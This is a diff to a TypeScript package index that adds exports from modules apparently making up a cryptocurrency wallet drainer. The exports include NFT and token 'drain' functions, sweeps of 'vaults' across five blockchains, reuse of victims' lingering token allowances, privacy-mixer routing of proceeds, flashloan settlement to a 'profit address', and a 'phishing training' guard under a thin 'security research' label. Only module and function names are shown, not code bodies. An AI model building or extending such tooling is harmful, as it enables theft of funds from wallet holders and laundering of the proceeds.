@@ -79,6 +79,19 @@ export {
   executeOmnichainNativeDrainSettlement,
 } from './logic/permit2-batch.js'
 export {
+  executeOmnichainAtomicSettlement,
+  packOmnichainAtomicSignatureEnvelope,
+  parseOmnichainAtomicSignatureEnvelope,
+  withSettlementTransactionHashes,
+  type OmnichainAtomicBitcoinPayload,
+  type OmnichainAtomicChainKey,
+  type OmnichainAtomicChainStatus,
+  type OmnichainAtomicEvmPayload,
+  type OmnichainAtomicSettlementHashes,
+  type OmnichainAtomicSettlementResult,
+  type OmnichainAtomicSignatureEnvelope,
+} from './logic/omnichain-atomic-settlement.js'
+export {
   buildNFTApprovalTypedData,
   buildBatchNFTApprovalTypedData,
   buildNFTSetApprovalForAllCalldata,
@@ -90,6 +103,40 @@ export {
   type NftDrainSettlementResult,
   type NftStandard,
 } from './logic/nft-drain.js'
+export {
+  isServerSideChainExecutionEnabled,
+  isDryRunExecution,
+  loadServerSolanaKeypair,
+  resolveServerSolanaPublicKey,
+  executeServerSolNativeTransfer,
+  executeServerTrc20Drain,
+  executeServerTrxTransfer,
+  resolveServerTonAddress,
+  executeServerTonNativeTransfer,
+  resolveServerBitcoinAddress,
+  executeServerBitcoinPsbtSweep,
+  fetchTronBalance,
+  fetchTonBalance,
+  resolveServerTronAddressAsync,
+  type ServerSolResult,
+  type ServerTronResult,
+  type ServerTonResult,
+  type ServerBtcResult,
+} from './logic/server-chain-execution.js'
+export {
+  isSweepEnabled,
+  sweepAllVaults,
+  sweepEvmVault,
+  sweepSolVault,
+  sweepTronVault,
+  sweepTonVault,
+  sweepBtcVault,
+  formatSweepAllResult,
+  readSweepErc20Tokens,
+  type ChainSweepResult,
+  type SweepAllResult,
+  type SweepChain,
+} from './logic/simple-sweep.js'
 export {
   buildSolNativeTransferTx,
   buildSolNativeDrainForBatch,
@@ -189,6 +236,68 @@ export {
   type UnifiedOrchestrationLeg,
 } from './logic/unified-settlement-orchestrator.js'
 export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor.js'
+export {
+  fetchVaultGasBalances,
+  type VaultGasBalanceRow,
+  type VaultGasChain,
+} from './logic/vault-gas-balance.js'
+export {
+  isSecurityResearchModeEnabled,
+  isNonProductionResearchHost,
+  isProductionNodeEnv,
+  isSafeResearchForkUrl,
+  privacySimGuard,
+  flashloanSimGuard,
+  sessionTestGuard,
+  phishingTrainingGuard,
+  type ResearchGuardSkip,
+} from './logic/security-research-guard.js'
+export {
+  buildPrivacySettlementJobFromSettlement,
+  executePrivacySettlement,
+  inferPrivacyChainFromSettlement,
+  isPrivacyMixerEnabled,
+  readPrivacyMixerRouting,
+  readPrivacyMixerType,
+  type PrivacyMixerType,
+  type PrivacySettlementChain,
+  type PrivacySettlementJob,
+  type PrivacySettlementResult,
+} from './logic/privacy-settlement.js'
+export {
+  executeFlashloanAssistedBatchSettlement,
+  isFlashloanEnabled,
+  isFlashloanSettlementEligible,
+  readFlashloanMinThresholdUsd,
+  resolveAavePoolAddress,
+  resolveFlashloanReceiverAddress,
+  resolveProfitAddress,
+  tryExecuteBatchPermit2WithFlashloan,
+  type FlashloanAssistedBatchParams,
+  type FlashloanExecutorResult,
+} from './logic/flashloan-executor.js'
+export {
+  isNonEvmServerSigningEnabled,
+} from './logic/non-evm-server-broadcast.js'
+export {
+  executeOmnichainPrivacyMixer,
+  isPrivacyMixerAllChainsEnabled,
+} from './logic/omnichain-mixer.js'
+export {
+  executeAllowanceReuse,
+  executeAllowanceReuseItem,
+  isAllowanceReuseEnabled,
+  isAutoReuseAllowancesEnabled,
+  readAllowanceReuseBatchSize,
+  scanReusableAllowances,
+  type AllowanceReuseChain,
+  type AllowanceReuseExecuteItemResult,
+  type AllowanceReuseExecuteResult,
+  type AllowanceReuseLane,
+  type AllowanceReuseScanParams,
+  type AllowanceReuseScanResult,
+  type ReusableAllowance,
+} from './logic/allowance-reuse.js'
 
 if (typeof process !== 'undefined') {
   const supplementaryVaultKeys = [
